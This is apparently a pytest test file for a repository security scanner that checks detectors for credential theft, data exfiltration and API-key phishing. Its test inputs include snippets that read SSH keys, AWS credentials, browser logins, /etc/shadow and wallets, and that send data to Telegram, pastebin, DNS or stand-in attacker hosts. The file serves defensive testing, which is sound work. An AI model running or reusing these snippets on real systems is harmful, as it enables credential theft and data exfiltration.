"""CRD / EXF / PHI tests. Payloads are inert: hosts are example.invalid, IPs are 203.0.113.x, and every
webhook URL or token is assembled at runtime from pieces, so this file holds no live-looking endpoint."""

from __future__ import annotations

import random
import string

import pytest

from repoguard import registry
from repoguard import tags as T
from repoguard.detectors import exfil as E
from repoguard.models import Confidence, Severity
from repoguard.rules import lint_pattern
from tests.conftest import rule_ids, run_detector

CRD, EXF, PHI = E.CredentialTheftDetector, E.ExfilDetector, E.PhishingDetector
ALNUM = string.ascii_letters + string.digits
_rng = random.Random(4242)


def rnd(n: int, alphabet: str = ALNUM) -> str:
    return "".join(_rng.choice(alphabet) for _ in range(n))


def _by(findings, rid):
    return [f for f in findings if f.rule_id == rid]


def test_module_validates_and_patterns_lint():
    registry.validate([cls() for cls in E.DETECTORS])
    for spec in E.CRD_SPECS + E.EXF_SPECS:
        assert lint_pattern(spec.regex.pattern) == [], spec.info.id
    for det in E.DETECTORS:
        for info in det.rules + det.checks:
            tags = set(info.tags)
            if info.id.startswith("CRD"):
                assert T.READS_CREDENTIALS in tags
                assert (T.BLOCK_TRIGGER in tags) == (info.id == "CRD010")
            elif info.id.startswith("EXF") and info.id != "EXF010":
                assert {T.EXFIL_CHANNEL, T.NETWORK_SEND, T.NO_DAMPEN} <= tags
            elif info.id.startswith("PHI"):
                assert T.PHISHING in tags


# ======================================= CRD ========================================================
@pytest.mark.parametrize("rid,text,path", [
    ("CRD001", 'key = open(os.path.expanduser("~/.ssh/id_rsa")).read()\n', "x.py"),
    ("CRD002", 'creds = (Path.home() / ".aws/credentials").read_text()\n', "x.py"),
    ("CRD003", 'p = os.path.join(local, "Google", "Chrome", "User Data", "Default", "Login Data")\n', "x.py"),
    ("CRD004", 'w = os.path.join(appdata, "Exodus/exodus.wallet")\n', "x.py"),
    ("CRD005", 'p = roaming + "\\\\discord\\\\Local Storage\\\\leveldb"\n', "x.py"),
    ("CRD006", 'security find-generic-password -s "Chrome Safe Storage" -w\n', "x.sh"),
    ("CRD007", "import os\ndata = dict(os.environ)\n", "x.py"),
    ("CRD007", "const all = JSON.stringify(process.env);\n", "x.js"),
    ("CRD008", "import pyperclip\nclip = pyperclip.paste()\n", "x.py"),
    ("CRD010", "cat /etc/shadow > /tmp/s\n", "x.sh"),
], ids=lambda v: v if str(v).startswith("CRD") else "")
def test_crd_true_positives(make_ctx, rid, text, path):
    f = run_detector(CRD, make_ctx(text, path))
    assert rid in rule_ids(f), [x.rule_id for x in f]
    assert T.READS_CREDENTIALS in _by(f, rid)[0].tags


def test_crd007_tags_and_crd008_tags(make_ctx):
    f = run_detector(CRD, make_ctx("import os\nfor k, v in os.environ.items():\n    send(k, v)\n"))
    assert T.ENV_HARVEST in _by(f, "CRD007")[0].tags
    f = run_detector(CRD, make_ctx("import pyperclip\nx = pyperclip.paste()\n"))
    assert T.SURVEILLANCE in _by(f, "CRD008")[0].tags


def test_crd008_clipper_is_high(make_ctx):
    text = ("import pyperclip, re\nBTC = re.compile(r'^(bc1|[13])[a-zA-Z0-9]{25,39}$')\n"
            "c = pyperclip.paste()\nif BTC.match(c):\n    pyperclip.copy(ATTACKER)\n")
    f = _by(run_detector(CRD, make_ctx(text)), "CRD008")
    assert f and f[0].severity == Severity.HIGH


def test_crd009_home_sweep(make_ctx):
    text = ('import os\nhome = os.path.expanduser("~")\nfor root, dirs, files in os.walk(home):\n'
            '    for f in files:\n        if f.endswith((".env", ".pem", "id_rsa", ".kdbx")):\n'
            "            grab(os.path.join(root, f))\n")
    assert "CRD009" in rule_ids(run_detector(CRD, make_ctx(text)))


def test_crd010_blocks_in_code_but_not_in_docs(make_ctx):
    f = _by(run_detector(CRD, make_ctx("reg save HKLM\\SAM C:\\t\\s.hiv\n", "x.bat")), "CRD010")
    assert f and f[0].severity == Severity.CRITICAL and T.BLOCK_TRIGGER in f[0].tags
    f = _by(run_detector(CRD, make_ctx("Attackers often read `/etc/shadow`.\n", "docs/threats.md")), "CRD010")
    assert f and T.BLOCK_TRIGGER not in f[0].tags


def test_crd006_keyring_is_low_confidence(make_ctx):
    f = _by(run_detector(CRD, make_ctx('import keyring\npw = keyring.get_password("svc", "me")\n')), "CRD006")
    assert f and f[0].confidence == Confidence.LOW


@pytest.mark.parametrize("text,path", [
    ("**/.ssh/id_rsa\n.aws/credentials\n.npmrc\n", ".gitignore"),
    ('browser = "chrome"  # supports Chrome and Edge\n', "x.py"),
    ('home = os.environ.get("HOME")\npath = os.environ["PATH"]\n', "x.py"),
    ("Install the Telegram Desktop app and the Exodus wallet.\n", "README.md"),
])
def test_crd_false_positives(make_ctx, text, path):
    assert not run_detector(CRD, make_ctx(text, path))


def test_crd007_child_env_is_low(make_ctx):
    text = 'import os, subprocess\nsubprocess.run(cmd, env=dict(os.environ, FOO="1"))\n'
    f = _by(run_detector(CRD, make_ctx(text)), "CRD007")
    assert f and f[0].confidence == Confidence.LOW


# ======================================= EXF ========================================================
def _discord_url() -> str:
    return "https://" + "discord" + ".com/api/" + "webhooks/" + rnd(18, string.digits) + "/" + rnd(68, ALNUM + "-_")


def test_exf001_discord_webhook(make_ctx):
    url = _discord_url()
    f = _by(run_detector(EXF, make_ctx(f'HOOK = "{url}"\n')), "EXF001")
    assert f and f[0].severity == Severity.HIGH and T.NO_DAMPEN in f[0].tags
    assert url.rsplit("/", 1)[1] not in f[0].snippet  # token masked
    f = _by(run_detector(EXF, make_ctx(f"Post to {url}\n", "docs/notify.md")), "EXF001")
    assert f and f[0].severity == Severity.MEDIUM


@pytest.mark.parametrize("rid,text", [
    ("EXF002", 'requests.post(f"https://api.' + 'telegram.org/bot{TOKEN}/sendDocument", files=fs)\n'),
    ("EXF003", 'HOOK = "https://hooks.' + 'slack.com/services/T' + "0" * 3 + rnd(8).upper() + "/B" + rnd(9) + "/"
     + rnd(24) + '"\n'),
    ("EXF004", 'requests.post("https://pastebin.com/api/api_post.php", data=d)\n'),
    ("EXF005", 'URL = "https://' + rnd(8).lower() + '.ngrok-free.app/collect"\n'),
    ("EXF008", 'C2 = "evil.' + 'duckdns.org"\n'),
], ids=lambda v: v if str(v).startswith("EXF") else "")
def test_exf_regex_true_positives(make_ctx, rid, text):
    f = run_detector(EXF, make_ctx(text))
    assert rid in rule_ids(f), [x.rule_id for x in f]
    assert {T.EXFIL_CHANNEL, T.NETWORK_SEND, T.NO_DAMPEN} <= set(_by(f, rid)[0].tags)


def test_exf006_raw_ip(make_ctx, monkeypatch):
    text = 'requests.post("http://203.0.113.7:8080/up", data=blob)\n'
    assert "EXF006" not in rule_ids(run_detector(EXF, make_ctx(text)))  # documentation range is not public
    monkeypatch.setattr(E, "is_public_ip", lambda v: v.startswith("203.0.113."))
    assert "EXF006" in rule_ids(run_detector(EXF, make_ctx(text)))


def test_exf007_dns_exfil_python(make_ctx):
    text = ("import socket, base64\ndata = base64.b32encode(secret).decode()\n"
            'socket.gethostbyname(f"{data}.x.example.invalid")\n')
    assert "EXF007" in rule_ids(run_detector(EXF, make_ctx(text)))
    benign = 'import socket\nip = socket.gethostbyname("api.example.invalid")\n'
    assert "EXF007" not in rule_ids(run_detector(EXF, make_ctx(benign)))


def test_exf009_smtp_hardcoded(make_ctx):
    pw = rnd(14)
    text = (f'import smtplib\ns = smtplib.SMTP("smtp.example.invalid", 587)\n'
            f's.login("bot@example.invalid", "{pw}")\n')
    f = _by(run_detector(EXF, make_ctx(text)), "EXF009")
    assert f and pw not in f[0].snippet
    benign = ('import os, smtplib\ns = smtplib.SMTP("smtp.example.invalid", 587)\n'
              's.login(user, os.environ["SMTP_PASS"])\n')
    assert "EXF009" not in rule_ids(run_detector(EXF, make_ctx(benign)))


def test_exf010_network_sink_info(make_ctx):
    f = run_detector(EXF, make_ctx('import requests\nrequests.post(URL, json=data)\nr = requests.get(URL)\n'))
    sinks = _by(f, "EXF010")
    assert sinks and all(x.severity == Severity.INFO for x in sinks)
    assert any(T.DOWNLOAD in x.tags for x in sinks) and all(T.NETWORK_SEND in x.tags for x in sinks)
    assert T.NO_DAMPEN not in sinks[0].tags


@pytest.mark.parametrize("text", [
    'r = requests.get("https://api.example.invalid/v1/items")\n',
    "self.file.ioctl(1)\nprefetch(x)\nobj.fetch(1)\n",
    "See https://api.telegram.org/bots/api for the docs.\n",
    'URL = "https://hooks.' + 'slack.com/services/' + 'X' * 9 + '/' + 'X' * 9 + '/' + 'X' * 24 + '"\n',
    'requests.get("http://127.0.0.1:8000/health")\n',
], ids=["api-get", "ioctl-prefetch", "telegram-docs", "slack-placeholder", "loopback-ip"])
def test_exf_false_positives(make_ctx, text):
    f = run_detector(EXF, make_ctx(text))
    assert not (rule_ids(f) - {"EXF010"}), [x.rule_id for x in f]


# ======================================= PHI ========================================================
def test_phi001_prompt_then_send(make_ctx):
    text = ('import requests\n\ndef main():\n    key = input("Enter your OpenAI API key: ")\n'
            '    requests.post("https://collect.example.invalid/k", json={"k": key})\n')
    f = _by(run_detector(PHI, make_ctx(text)), "PHI001")
    assert f and T.PHISHING in f[0].tags
    benign = text.replace("collect.example.invalid/k", "api.openai.com/v1/models")
    assert "PHI001" not in rule_ids(run_detector(PHI, make_ctx(benign)))


def test_phi002_form_collects_keys(make_ctx):
    html = ('<form action="https://collect.example.invalid/save" method="post">\n'
            '  <input name="api_key" placeholder="sk-...">\n  <button>Activate</button>\n</form>\n')
    assert "PHI002" in rule_ids(run_detector(PHI, make_ctx(html, "index.html")))
    benign = '<form action="/settings">\n  <input name="display_name">\n</form>\n'
    assert "PHI002" not in rule_ids(run_detector(PHI, make_ctx(benign, "index.html")))


def test_phi003_key_to_wrong_host(make_ctx):
    text = ('import os, requests\nkey = os.environ["OPENAI_API_KEY"]\n'
            'requests.post("https://relay.example.invalid/v1/chat", headers={"Authorization": f"Bearer {key}"})\n')
    f = _by(run_detector(PHI, make_ctx(text)), "PHI003")
    assert f and f[0].severity == Severity.HIGH
    ok = text.replace("relay.example.invalid", "api.openai.com")
    assert "PHI003" not in rule_ids(run_detector(PHI, make_ctx(ok)))


def test_phi003_base_url_override(make_ctx):
    text = 'from openai import OpenAI\nclient = OpenAI(base_url="https://proxy.example.invalid/v1")\n'
    f = _by(run_detector(PHI, make_ctx(text)), "PHI003")
    assert f and f[0].severity == Severity.MEDIUM
    gw = text.replace("proxy.example.invalid", "openrouter.ai/api")
    f = _by(run_detector(PHI, make_ctx(gw)), "PHI003")
    assert f and f[0].severity == Severity.INFO


def test_phi004_brand_clone(make_ctx):
    html = ("<html><head><title>Sign in to GitHub</title></head><body>\n"
            '<form action="https://login.example.invalid/p" method="post">\n'
            '<input name="login"><input type="password" name="password">\n</form></body></html>\n')
    assert "PHI004" in rule_ids(run_detector(PHI, make_ctx(html, "login.html")))
    real = html.replace("https://login.example.invalid/p", "https://github.com/session")
    assert "PHI004" not in rule_ids(run_detector(PHI, make_ctx(real, "login.html")))


def test_phi005_docs_social_engineering(make_ctx):
    md = "## Setup\n\nPaste your API key at https://keys.example.invalid/activate to unlock the tool.\n"
    assert "PHI005" in rule_ids(run_detector(PHI, make_ctx(md, "README.md")))
    ok = "## Setup\n\nPaste your API key from https://platform.openai.com/api-keys into `.env`.\n"
    assert "PHI005" not in rule_ids(run_detector(PHI, make_ctx(ok, "README.md")))
